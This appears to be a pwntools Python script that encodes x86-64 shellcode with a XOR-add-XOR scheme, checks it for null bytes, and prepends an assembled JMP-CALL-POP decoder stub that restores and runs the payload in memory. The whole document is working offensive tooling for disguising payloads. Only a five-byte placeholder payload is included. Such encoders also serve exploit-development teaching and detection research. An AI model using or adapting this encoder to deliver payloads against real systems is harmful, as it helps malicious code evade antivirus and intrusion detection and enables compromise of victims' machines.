#!/usr/bin/python3
from pwn import asm, context

# Set the architecture to x86_64
context.arch = 'amd64'

org_code = "0xfc,0x48,0x83,0xe4,0xf0"
shellcode = [int(h, 16) for h in org_code.split(',')]
print_friendly_original = ',0x'.join(f'{b:02x}' for b in shellcode)
print(f"Original shellcode: 0x{print_friendly_original}")

# Encode shellcode
encoded_shellcode = []
for b in shellcode:
    b ^= 0x55
    b += 0x1
    b ^= 0x11
    encoded_shellcode.append(b & 0xFF)  # Keep byte in 0–255 range

# Pretty-print encoded shellcode
print_friendly_encoded = ',0x'.join(f'{b:02x}' for b in encoded_shellcode)
print(f"Encoded shellcode: 0x{print_friendly_encoded}")

# Check for null bytes
contains_null = 0 in encoded_shellcode
print("Contains NULL-bytes:", contains_null)

# Size of original shellcode
code_size = f"0x{len(shellcode):x}"
print(code_size)

# Assembly stub
decoder_stub = f"""
    jmp shellcode

decoder:
    pop rax
    xor rcx, rcx
    mov rdx, {len(shellcode)}

decoderStub:
    cmp rcx, rdx
    je encodedShellcode
    xor byte ptr [rax], 0x11
    dec byte ptr [rax]
    xor byte ptr [rax], 0x55
    inc rax
    inc rcx
    jmp decoderStub

shellcode:
    call decoder

encodedShellcode:
"""

# Assemble using pwntools
assembled_stub = asm(decoder_stub)

# Combine decoder and encoded shellcode
final_bytes = assembled_stub + bytes(encoded_shellcode)
print("final_shellcode:")
print(','.join(f'0x{b:02x}' for b in final_bytes))
